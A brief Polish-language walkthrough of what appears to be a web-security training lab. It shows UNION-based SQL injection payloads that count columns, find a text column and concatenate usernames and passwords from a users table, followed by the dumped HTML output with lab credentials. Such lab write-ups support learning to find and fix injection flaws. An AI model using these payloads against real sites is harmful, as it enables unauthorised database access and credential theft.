SQL injection UNION attack, retrieving multiple values in a single column
Pierwszym krokiem było określenie liczy kolumn w przechwyconym pakiecie.
``` ' UNION SELECT NULL-- ```
I zwiększamy wartość NULL po przecinku NULL,NULL-- do momętu aż uzyskamy HTTP/2 200 OK 
Następnie jeśli już uskamy tą wartość, musimy dowiedzieć się, która z tych kolumn zawiera tekst, w tym przypadku była to druga kolumna, określiłem to za pomocą ``` ' UNION SELECT NULL,'abc'-- ```
W kolejnym kroku musimy utworzyć zapytanie wiemy, że baza danych zawiera tabelę users z kolumniami username,password. Oto zapytanie.
``` ' UNION SELECT NULL, username || '~' || password FROM users-- ```
Wartość NULL jest tutaj zapisana ponieważ wiemy, że pierwsza tabela nie zawiera tylko druga. dzięki temu zapytaniu uzyskałem zrzut całe bazy danych.
```
                            <th>wiener~xkhstq2rd73ukf1yddjo</th>
                        </tr>
                        <tr>
                            <th>administrator~2nwssjbzicownbljqt8w</th>
                        </tr>
                        <tr>
                            <th>carlos~qvjff1y3mqjqk784v7lc
```
